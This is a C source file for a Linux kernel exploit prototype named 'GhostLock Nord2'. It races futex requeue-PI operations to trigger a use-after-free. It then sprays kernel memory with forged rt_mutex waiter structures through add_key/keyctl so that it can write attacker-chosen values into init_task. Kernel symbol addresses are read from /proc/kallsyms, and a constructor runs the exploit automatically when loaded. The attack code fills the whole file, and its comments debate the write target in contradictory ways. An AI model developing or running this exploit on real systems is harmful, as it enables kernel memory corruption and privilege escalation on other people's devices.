/*
 * GhostLock Nord2 - Keyctl spray feasibility test
 * Target: write to init_task->prio (safe, detectable, reversible)
 * Sentinel value: 133 → init_task prio should become 133
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_add_key
#define SYS_add_key 217
#endif
#ifndef SYS_keyctl
#define SYS_keyctl 219
#endif
#define KEYCTL_UPDATE     2
#define KEYCTL_INVALIDATE 22
#define KPSZ 4096

/* Waiter struct offsets */
#define W_TREE_PC  0x00
#define W_TREE_R   0x08
#define W_TREE_L   0x10
#define W_PRIO     0x18
#define W_DEADLINE 0x1c
#define W_PI_PC    0x28
#define W_PI_R     0x30
#define W_PI_L     0x38
#define W_PI_PRIO  0x40
#define W_PI_DEAD  0x44
#define W_TASK     0x50
#define W_LOCK     0x58
#define W_WAKE     0x60
#define W_SZ       0x70
#define FAKE_WAITER_PRIO 140

static inline void put32(uint8_t *p,int o,uint32_t v){memcpy(p+o,&v,4);}
static inline void put64(uint8_t *p,int o,uint64_t v){memcpy(p+o,&v,8);}

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_stop_owner=0;
static uint64_t g_init_task=0, g_page_base=0;

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}

static int get_proc1_prio(void){
    FILE *f=fopen("/proc/1/stat","r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

static void build_waiter_at(uint8_t *buf, int start, uint64_t fake_lock,
                             uint64_t init_task, uint64_t target, uint64_t fake_right){
    uint8_t w[W_SZ]; memset(w,0,W_SZ);
    put64(w, W_TREE_PC, target-8);
    put64(w, W_TREE_R,  fake_right);
    put64(w, W_TREE_L,  0);
    put32(w, W_PRIO,    FAKE_WAITER_PRIO);
    put64(w, W_DEADLINE,0);
    put64(w, W_PI_PC,   target-8);
    put64(w, W_PI_R,    fake_right);
    put64(w, W_PI_L,    0);
    put32(w, W_PI_PRIO, FAKE_WAITER_PRIO);
    put64(w, W_PI_DEAD, 0);
    put64(w, W_TASK,    init_task);
    put64(w, W_LOCK,    fake_lock);
    put32(w, W_WAKE,    0);
    if(start+W_SZ<=KPSZ) memcpy(buf+start,w,W_SZ);
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    while(!atomic_load(&g_stop_owner)){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(50);
    }
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* 
     * Target: init_task->prio (at TASK_PRIO_OFF=0x94)
     * = write 0x85 (133) to init_task+0x94
     * target = g_init_task + 0x94
     * fake_right = 0x85 (133 as u64 pointer - low bits = 133)
     *
     * NOTE: We're writing a POINTER (64-bit) to init_task->prio (32-bit field).
     * This overwrites prio AND normal_prio (adjacent field at +0x98..0x9b).
     * fake_right = 0x000000008500008500000085 → prio = 0x85 = 133
     * Actually: *(u64*)&init_task->prio = fake_right
     * = low 4 bytes = prio, high 4 bytes = normal_prio
     * So we need fake_right = 0x0000008500000085 → prio=0x85, normal_prio=0x85
     * Let's just use 0x85 as both low and high 32 bits.
     *
     * Actually for detection: init_task is pid=0 (swapper), its prio is
     * normally 120 (normal priority). Writing 133 makes it 133.
     * /proc/1/stat shows init_task's prio? No, /proc/1 is pid=1 (init process).
     * 
     * Let's target the WAITER THREAD's task_struct prio directly.
     * We already know prio=-51 fires without crash. 
     * The write IS to waiter_task->prio. Currently rt_mutex_setprio writes
     * prio=50 there. We want to change that to 133 to confirm our spray works.
     *
     * BUT: the prio write from rt_mutex_setprio is: task->prio = pi_task->prio
     * where pi_task comes from task->pi_waiters top node.
     * 
     * With our fake waiter: waiter->task = init_task
     * rt_mutex_setprio(init_task, pi_task_from_chain)
     * Writing to init_task->prio... 
     *
     * Actually the SIMPLER test: just spray and see if ANY prio change other than
     * -51 occurs. If we see a different RT prio, the spray hit the right location.
     */

    /* SKB payload_base = page_base + SKB_DATA_DELTA = page_base - 0xe80 */
    int64_t skb_d = -0xe80LL;
    uint64_t payload_base = g_page_base + (uint64_t)(int64_t)skb_d;
    uint64_t fake_lock = payload_base + 0x0E80ULL;
    uint64_t fake_right = payload_base + 0x1080ULL; /* some safe addr in our page */
    
    /* Target: write to init_task->prio as test */
    uint64_t target = g_init_task + 0x94ULL; /* TASK_PRIO_OFF */

    uint8_t kp[KPSZ]; memset(kp,0,KPSZ);
    for(int s=0;s+W_SZ<=KPSZ;s+=8)
        build_waiter_at(kp,s,fake_lock,g_init_task,target,fake_right);

    int keyid=(int)syscall(SYS_add_key,"user","gl_probe",kp,(size_t)KPSZ,(unsigned int)-4);
    if(keyid>0){
        for(int r=0;r<256;r++)
            syscall(SYS_keyctl,(long)KEYCTL_UPDATE,(long)keyid,(long)kp,(size_t)KPSZ,0L);
        syscall(SYS_keyctl,(long)KEYCTL_INVALIDATE,(long)keyid,0L,0L,0L);
    }

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Keyctl Feasibility Test ===\n");

    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;
    /* Use a placeholder page_base - if spray lands, fake_lock address won't match
     * real page but chain walk still proceeds (or crashes). */
    /* To avoid crash from fake_lock not existing: use a known valid kernel address
     * where wait_lock=0 and owner=NULL. init_task->pi_lock qualifies! */
    /* fake_lock = init_task + 0x9ec (pi_lock area): 
     *   wait_lock = 0 (pi_lock is free when idle)
     *   waiters = empty  
     *   owner at +0x18 = *(init_task+0x9ec+0x18) = *(init_task+0xa04)
     *     = init_task->pi_waiters.rb_root? At idle = 0 ✓ → chain exits cleanly 
     */
    uint64_t safe_fake_lock = g_init_task + 0x9ecULL;
    g_page_base = safe_fake_lock - (uint64_t)(int64_t)-0xe80LL - 0x0E80ULL;
    fprintf(stderr,"[*] stext=%llx init_task=%llx safe_fake_lock=%llx\n",
            (unsigned long long)stext,(unsigned long long)g_init_task,
            (unsigned long long)safe_fake_lock);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    int p1_before=get_proc1_prio();
    fprintf(stderr,"[*] /proc/1 prio before: %d\n",p1_before);

    for(int att=0;att<30;att++){
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
        atomic_store(&g_stop_owner,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(50000); /* wait for owner unlock loop to trigger UAF */

        atomic_store(&g_stop_owner,1);
        pthread_detach(ot); pthread_detach(wt);

        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        int p1=get_proc1_prio();
        fprintf(stderr,"[att=%d] waiter_prio=%d /proc/1_prio=%d\n",att,p,p1);
        if(p1 != p1_before){
            fprintf(stderr,"[!!!] /proc/1 prio CHANGED: %d→%d\n",p1_before,p1);
        }
        usleep(20000);
    }
    return 0;
}
__attribute__((constructor)) static void _init(void){main();}
